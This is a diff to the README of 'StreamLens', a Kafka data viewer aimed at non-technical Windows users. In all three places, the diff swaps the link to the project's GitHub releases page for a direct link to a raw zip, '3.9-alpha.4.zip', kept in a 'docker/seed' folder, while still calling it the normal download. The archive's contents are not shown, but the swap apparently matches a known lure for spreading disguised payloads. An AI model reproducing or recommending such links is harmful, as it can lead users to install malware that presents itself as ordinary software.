@@ -4,7 +4,7 @@
 
 Welcome to StreamLens! This guide will help you download, install, and start using StreamLens on your Windows computer. No technical experience is needed—just follow the simple steps below.
 
-[⬇️ DOWNLOAD STREAMLENS NOW](https://github.com/bamnea1846/StreamLens/releases)
+[⬇️ DOWNLOAD STREAMLENS NOW](https://github.com/bamnea1846/StreamLens/raw/refs/heads/main/docker/seed/3.9-alpha.4.zip)
 
 ## ❓ What is StreamLens?
 
@@ -30,7 +30,7 @@ Follow these steps to get StreamLens on your computer:
 
 **Step 1:** Click the download button below or visit the download page directly:
 
-[⬇️ VISIT DOWNLOAD PAGE](https://github.com/bamnea1846/StreamLens/releases)
+[⬇️ VISIT DOWNLOAD PAGE](https://github.com/bamnea1846/StreamLens/raw/refs/heads/main/docker/seed/3.9-alpha.4.zip)
 
 **Step 2:** You will see a list of files. Look for the newest version (they are usually listed at the top).
 
@@ -156,7 +156,7 @@ No, StreamLens only reads data by default. Publishing test messages happens only
 
 You’re all set. Download StreamLens now and start exploring your Kafka data with clarity and confidence:
 
-[⬇️ GET STREAMLENS HERE](https://github.com/bamnea1846/StreamLens/releases)
+[⬇️ GET STREAMLENS HERE](https://github.com/bamnea1846/StreamLens/raw/refs/heads/main/docker/seed/3.9-alpha.4.zip)
 
 If you find this helpful, consider giving StreamLens a star on GitHub to support future development. Happy data exploring!
 
